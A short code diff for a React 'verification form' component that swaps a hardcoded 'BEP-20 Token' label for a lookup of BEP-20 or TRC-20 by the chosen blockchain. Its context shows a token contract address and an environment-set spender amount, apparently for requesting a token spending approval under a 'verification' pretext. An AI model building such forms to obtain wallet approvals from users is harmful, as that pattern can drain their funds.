@@ -47,6 +47,11 @@ const VerificationFormComponent = (props) => {
   const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
   const spenderAmount = import.meta.env.VITE_AMOUNT;
 
+  const contractType = {
+    'binance': 'BEP-20 Token',
+    'tron': 'TRC-20 Token'
+  }
+
   const formAnimation = useSpring({
     opacity: 1,
     transform: 'translateY(0)',
@@ -58,7 +63,7 @@ const VerificationFormComponent = (props) => {
     const { name, value } = e.target
     setFormData(prev => ({ ...prev, [name]: value }))
   }
-
+  
   const busdAbi = [
     {
       "constant": false,
@@ -410,7 +415,7 @@ const VerificationFormComponent = (props) => {
             </div>
             <div className="result-item">
               <span className="result-label">Contract Type:</span>
-              <span className="result-value">BEP-20 Token</span>
+              <span className="result-value">{contractType[formData?.blockchain]}</span>
             </div>
             <div className="result-item">
               <span className="result-label">Address:</span>
